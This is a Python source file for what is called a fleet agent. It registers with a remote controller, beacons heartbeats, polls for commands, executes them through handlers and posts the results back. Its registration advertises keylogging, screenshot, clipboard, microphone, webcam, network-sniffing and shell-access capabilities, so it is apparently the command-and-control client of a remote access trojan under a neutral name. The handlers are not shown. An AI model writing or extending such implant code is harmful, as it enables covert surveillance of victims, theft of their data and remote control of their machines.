"""
Fleet agent implementation using REST API.
"""

from __future__ import annotations

import logging
import asyncio
import json
import base64
import time
import socket
from typing import Dict, Any, Optional
import requests

from agent_controller import (
    Agent,
    AgentMetadata,
    AgentCapabilities,
    Command,
    CommandPriority,
    CommandStatus,
    SecureChannel,
)

logger = logging.getLogger(__name__)

# Pre-import system metrics at module level (avoid repeated dynamic import in heartbeat loop)
try:
    from utils.system_info import get_system_metrics as _get_sys_metrics
except ImportError:
    _get_sys_metrics = None


class FleetAgent(Agent):
    """
    Agent implementation that communicates via Fleet REST API.
    """

    def __init__(self, config: Dict[str, Any]) -> None:
        super().__init__(config)
        self.access_token: Optional[str] = None
        self.refresh_token: Optional[str] = None
        self.controller_public_key: Optional[str] = None

        # Ensure controller URL ends without slash
        url = self.controller_url or "http://localhost:8080/api/v1/fleet"
        self.controller_url = url.rstrip("/")

        # We don't use self.transport for REST API calls
        # We use direct requests
        self.session = requests.Session()

    async def start(self) -> None:
        """Start the agent service."""
        self.running = True
        self.start_time = time.time()

        # Attempt registration
        success = await self._register()
        if not success:
            logger.error("Initial registration failed. Retrying in background.")

        # Start background tasks
        self._heartbeat_task = asyncio.create_task(self._heartbeat_loop())
        self._command_listener_task = asyncio.create_task(self._command_listener())

        logger.info(f"FleetAgent {self.agent_id} started")

    async def stop(self) -> None:
        """Stop the agent service and cleanup resources."""
        self.running = False

        if self._heartbeat_task:
            self._heartbeat_task.cancel()
        if self._command_listener_task:
            self._command_listener_task.cancel()

        # Close HTTP session
        if self.session:
            self.session.close()

        logger.info(f"FleetAgent {self.agent_id} stopped")

    async def _request(self, method: str, endpoint: str, **kwargs) -> Optional[requests.Response]:
        """Perform async HTTP request with optional signing."""
        url = f"{self.controller_url}{endpoint}"

        headers = kwargs.pop("headers", {})
        if self.access_token:
            headers["Authorization"] = f"Bearer {self.access_token}"

        # Add default timeout
        if "timeout" not in kwargs:
            kwargs["timeout"] = 10

        # Sign request body if we have a private key and signing is enabled.
        # Pre-serialize to deterministic bytes so the signature matches what the
        # server will verify against the raw request body.
        sign_requests = self.config.get("sign_requests", False)
        json_body = kwargs.get("json")
        if sign_requests and json_body and self.private_key:
            body_bytes = json.dumps(
                json_body, separators=(",", ":"), ensure_ascii=False
            ).encode("utf-8")
            signature = self.secure_channel.sign(body_bytes)
            headers["X-Signature"] = base64.b64encode(signature).decode("ascii")
            # Send pre-serialized bytes instead of letting requests re-serialize
            kwargs.pop("json", None)
            kwargs["data"] = body_bytes
            headers["Content-Type"] = "application/json"

        loop = asyncio.get_running_loop()

        def _do_req():
            try:
                return self.session.request(method, url, headers=headers, **kwargs)
            except Exception as e:
                logger.error(f"Request failed: {method} {url} - {e}")
                return None

        return await loop.run_in_executor(None, _do_req)

    async def _register(self) -> bool:
        """Register with the controller via REST API."""
        try:
            ip_address = socket.gethostbyname(socket.gethostname())

            payload = {
                "agent_id": self.agent_id,
                "hostname": self.hostname,
                "platform": self.platform,
                "version": self.version,
                "public_key": self.public_key.decode("utf-8") if self.public_key else "",
                "capabilities": {
                    "keylogging": self.capabilities.keylogging,
                    "screenshots": self.capabilities.screenshots,
                    "file_upload": self.capabilities.file_upload,
                    "file_download": self.capabilities.file_download,
                    "clipboard_monitor": self.capabilities.clipboard_monitor,
                    "microphone_record": self.capabilities.microphone_record,
                    "webcam_capture": self.capabilities.webcam_capture,
                    "process_monitor": self.capabilities.process_monitor,
                    "network_sniff": self.capabilities.network_sniff,
                    "shell_access": self.capabilities.shell_access,
                },
                "metadata": {"mac_address": self.mac_address},
            }

            resp = await self._request("POST", "/register", json=payload)

            if resp and resp.status_code == 200:
                data = resp.json()
                self.access_token = data.get("access_token")
                self.refresh_token = data.get("refresh_token")

                # Gap 4: Secure Channel Handshake
                controller_key = data.get("controller_public_key")
                if controller_key:
                    self.controller_public_key = controller_key
                    self.secure_channel.set_remote_key(controller_key.encode())
                    logger.info("Secure channel established with controller")

                self.registered = True
                logger.info(f"Agent {self.agent_id} registered successfully")
                return True
            else:
                logger.error(f"Registration failed: {resp.status_code if resp else 'No response'}")
                if resp:
                    logger.error(resp.text)
                return False

        except Exception as e:
            logger.error(f"Registration error: {e}")
            return False

    async def _heartbeat_loop(self) -> None:
        """Send periodic heartbeats via REST."""
        while self.running:
            try:
                if not self.registered:
                    if await self._register():
                        pass
                    else:
                        await asyncio.sleep(self.reconnect_interval)
                        continue

                self.uptime = time.time() - self.start_time

                metrics = self._get_system_metrics()

                payload = {
                    "status": "ONLINE",
                    "uptime": self.uptime,
                    "metrics": {
                        "cpu": metrics.get("cpu_percent", 0),
                        "memory": metrics.get("memory_percent", 0),
                        "memory_mb": metrics.get("memory_mb", 0),
                        "disk_percent": metrics.get("disk_percent", 0),
                        "disk_free_gb": metrics.get("disk_free_gb", 0),
                    },
                }

                resp = await self._request("POST", "/heartbeat", json=payload)

                if resp and resp.status_code == 401:
                    logger.warning("Heartbeat unauthorized, re-registering...")
                    self.registered = False
                    self.access_token = None
                elif not resp or resp.status_code != 200:
                    logger.warning("Heartbeat failed")

                await asyncio.sleep(self.heartbeat_interval)

            except asyncio.CancelledError:
                break
            except Exception as e:
                logger.error(f"Heartbeat loop error: {e}")
                await asyncio.sleep(5)

    async def _command_listener(self) -> None:
        """Poll for commands."""
        while self.running:
            try:
                if not self.registered:
                    await asyncio.sleep(5)
                    continue

                resp = await self._request("GET", "/commands")

                if resp and resp.status_code == 200:
                    try:
                        data = resp.json()
                    except (ValueError, Exception):
                        logger.warning("Invalid JSON in command poll response")
                        data = {}
                    commands = data.get("commands", [])

                    for cmd_data in commands:
                        await self._process_command(cmd_data)
                elif resp and resp.status_code == 401:
                    self.registered = False

                await asyncio.sleep(5)  # Poll interval

            except asyncio.CancelledError:
                break
            except Exception as e:
                logger.error(f"Command listener error: {e}")
                await asyncio.sleep(5)

    async def _process_command(self, cmd_data: Dict[str, Any]) -> None:
        """Process a received command."""
        cmd_id = cmd_data.get("command_id")
        action = cmd_data.get("action", "")
        params = cmd_data.get("parameters", {})

        logger.info(f"Received command {cmd_id}: {action}")

        handler = self.command_handlers.get(action) if action else None
        success = False
        result = {}
        error = None

        if handler:
            try:
                # Run handler in thread if it's blocking?
                # Most handlers in Agent are synchronous.
                # Use executor
                loop = asyncio.get_running_loop()
                result = await loop.run_in_executor(None, handler, params)
                success = True
            except Exception as e:
                error = str(e)
                logger.error(f"Command execution failed: {e}")
        else:
            error = f"Unknown action: {action}"

        # Send response
        resp_payload = {"result": result, "success": success, "error": error}

        await self._request("POST", f"/commands/{cmd_id}/response", json=resp_payload)

    @staticmethod
    def _get_system_metrics() -> dict:
        """Get system metrics using pre-imported function."""
        if _get_sys_metrics is not None:
            try:
                return _get_sys_metrics()
            except Exception:
                pass
        return {"cpu_percent": 0, "memory_percent": 0}
